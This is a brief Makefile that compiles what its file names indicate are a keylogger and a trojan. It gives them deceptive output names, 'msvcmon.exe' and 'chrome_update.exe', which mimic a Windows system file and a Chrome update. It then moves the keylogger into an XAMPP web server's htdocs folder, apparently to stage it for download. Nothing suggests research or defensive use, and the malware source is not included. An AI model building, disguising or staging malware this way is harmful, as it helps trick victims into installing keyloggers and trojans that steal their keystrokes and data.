kylg_winapi:
	gcc kylg_winapi.c -o msvcmon.exe -luser32 -lgdi32 -lkernel32


fakechrome:
	gcc trojan.c -o chrome_update.exe -lwininet -luser32 -lole32 -lshell32 -static

move:
	mv "F:/projects/hacking projects/wintrapd/msvcmon.exe" "F:/command/xampp/htdocs/msvcmon.exe"

